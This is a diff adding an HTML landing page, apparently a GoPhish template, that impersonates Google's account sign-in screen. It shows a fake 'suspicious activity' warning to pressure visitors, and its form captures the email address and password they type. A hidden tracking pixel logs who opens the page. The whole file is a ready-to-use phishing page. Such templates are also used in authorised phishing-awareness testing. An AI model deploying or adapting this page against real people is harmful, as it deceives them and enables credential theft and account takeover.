@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 16px;
+    }
+    .card {
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 48px 40px 36px;
+      width: 100%;
+      max-width: 450px;
+    }
+    .logo { text-align: center; margin-bottom: 24px; }
+    .logo img { height: 24px; }
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #202124;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 16px;
+      color: #202124;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .alert-box {
+      background: #fce8e6;
+      border: 1px solid #d93025;
+      border-radius: 4px;
+      padding: 12px 16px;
+      margin-bottom: 24px;
+      font-size: 13px;
+      color: #d93025;
+      line-height: 1.5;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 13px 15px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+      color: #202124;
+      outline: none;
+      margin-bottom: 24px;
+      transition: border-color 0.2s;
+    }
+    input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+    .form-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+    }
+    a.forgot { font-size: 14px; color: #1a73e8; text-decoration: none; }
+    a.forgot:hover { text-decoration: underline; }
+    button[type="submit"] {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button[type="submit"]:hover { background: #1558b0; }
+    .divider { border-top: 1px solid #e8eaed; margin: 24px 0; }
+    .create-account {
+      text-align: center;
+      font-size: 14px;
+    }
+    .create-account a { color: #1a73e8; text-decoration: none; }
+    .create-account a:hover { text-decoration: underline; }
+    .step-hint {
+      font-size: 13px;
+      color: #5f6368;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logo">
+      <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png"
+           alt="Google" />
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to Google Workspace</p>
+
+    <div class="alert-box">
+      ⚠️ Suspicious activity detected on your account. Verify your identity to restore full access.
+    </div>
+
+    <!-- GoPhish credential capture form -->
+    <form action="" method="POST">
+      <input type="hidden" name="gophish_redirect" value="{{.URL}}" />
+
+      <input
+        type="email"
+        name="email"
+        id="email"
+        placeholder="Email or phone"
+        autocomplete="email"
+        value="{{.Email}}"
+        required
+      />
+
+      <p class="step-hint">Enter your password to verify your identity</p>
+
+      <input
+        type="password"
+        name="password"
+        id="password"
+        placeholder="Enter your password"
+        autocomplete="current-password"
+        required
+      />
+
+      <div class="form-footer">
+        <a href="#" class="forgot">Forgot password?</a>
+        <button type="submit">Next</button>
+      </div>
+    </form>
+
+    <div class="divider"></div>
+
+    <div class="create-account">
+      <a href="#">Create account</a>
+    </div>
+  </div>
+
+  <!-- GoPhish tracking pixel -->
+  <img src="{{.TrackingURL}}" width="1" height="1" style="display:none;" alt="" />
+
+</body>
+</html>
